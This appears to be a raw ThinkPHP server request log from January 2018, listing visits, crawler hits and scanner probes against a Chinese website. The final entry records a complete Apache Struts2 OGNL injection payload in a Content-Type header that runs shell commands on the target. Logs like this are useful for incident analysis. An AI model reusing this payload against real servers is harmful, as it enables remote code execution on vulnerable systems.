  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T15:14:36+08:00 ] 172.17.195.153 23.225.176.190 GET /pmd
[ log ] 39.106.4.226/pmd [运行时间：0.010909s][吞吐率：91.67req/s] [内存消耗：1,509.24kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'pmd',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://39.106.4.226/pmd',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '39.106.4.226',
  'content-type' => 'application/x-www-form-urlencoded',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T15:14:36+08:00 ] 172.17.195.153 23.225.176.190 GET /pmd
[ log ] 39.106.4.226/pmd [运行时间：0.011467s][吞吐率：87.21req/s] [内存消耗：1,509.24kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'pmd',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://39.106.4.226/pmd',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '39.106.4.226',
  'content-type' => 'application/x-www-form-urlencoded',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T16:20:56+08:00 ] 172.17.195.153 114.215.45.101 GET /
[ log ] 39.106.4.62:80/ [运行时间：0.025260s][吞吐率：39.59req/s] [内存消耗：2,778.29kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '39.106.4.62:80',
  'connection' => 'Close',
  'accept-encoding' => 'identity',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T19:44:09+08:00 ] 172.17.195.153 112.90.82.196 GET /
[ log ] www.xinchumenye.com/ [运行时间：0.024214s][吞吐率：41.30req/s] [内存消耗：2,779.00kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.xinchumenye.com',
  'accept-encoding' => 'deflate, gzip',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'connection' => 'Close',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T22:06:13+08:00 ] 172.17.195.153 219.129.216.239 GET /
[ log ] www.xinchumenye.com/ [运行时间：0.025810s][吞吐率：38.74req/s] [内存消耗：2,778.84kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn,zh;q=0.5',
  'accept-charset' => 'GB2312,utf-8;q=0.7,*;q=0.7',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Close',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T22:40:48+08:00 ] 172.17.195.153 140.205.225.192 GET /
[ log ] 39.106.4.226/ [运行时间：0.027079s][吞吐率：36.93req/s] [内存消耗：2,778.64kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378.p)',
  'host' => '39.106.4.226',
  'referer' => 'http://39.106.4.226/',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip,deflate',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T22:44:06+08:00 ] 172.17.195.153 140.205.225.192 GET /rs-status
[ log ] 39.106.4.226:80/rs-status [运行时间：0.011671s][吞吐率：85.68req/s] [内存消耗：1,508.94kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'rs-status',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T22:48:12+08:00 ] 172.17.195.153 140.205.225.192 GET /ganglia/index.php
[ log ] 39.106.4.226:80/ganglia/index.php [运行时间：0.011612s][吞吐率：86.12req/s] [内存消耗：1,509.27kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ganglia',
    1 => 'index.php',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T22:56:05+08:00 ] 172.17.195.153 140.205.225.192 GET /index.php
[ log ] 39.106.4.226:80/index.php [运行时间：0.024810s][吞吐率：40.31req/s] [内存消耗：2,778.90kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T23:03:07+08:00 ] 172.17.195.153 140.205.225.192 GET /jobs/
[ log ] 39.106.4.226:80/jobs/ [运行时间：0.011599s][吞吐率：86.21req/s] [内存消耗：1,508.91kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'jobs',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T23:06:44+08:00 ] 172.17.195.153 219.150.218.137 GET /upgrade/src/version.manifest
[ log ] www.wkmajiang.com/upgrade/src/version.manifest [运行时间：0.011605s][吞吐率：86.17req/s] [内存消耗：1,508.77kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'upgrade',
    1 => 'src',
    2 => 'version.manifest',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.wkmajiang.com',
  'connection' => 'Keep-Alive',
  'accept-encoding' => 'gzip',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T23:54:40+08:00 ] 172.17.195.153 222.186.172.43 GET /
[ log ] 39.106.4.226/ [运行时间：0.023733s][吞吐率：42.14req/s] [内存消耗：2,778.62kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705',
  'accept' => '*/*',
  'host' => '39.106.4.226',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T23:54:40+08:00 ] 172.17.195.153 222.186.172.43 GET /index.action
[ log ] 39.106.4.226/index.action [运行时间：0.011459s][吞吐率：87.27req/s] [内存消耗：1,509.81kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index.action',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
  'accept' => '*/*',
  'host' => '39.106.4.226',
  'content-type' => '%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'whoami\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'echo windows--2017\'}:{\'/bin/bash\',\'-c\',\'echo linux--2017\'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
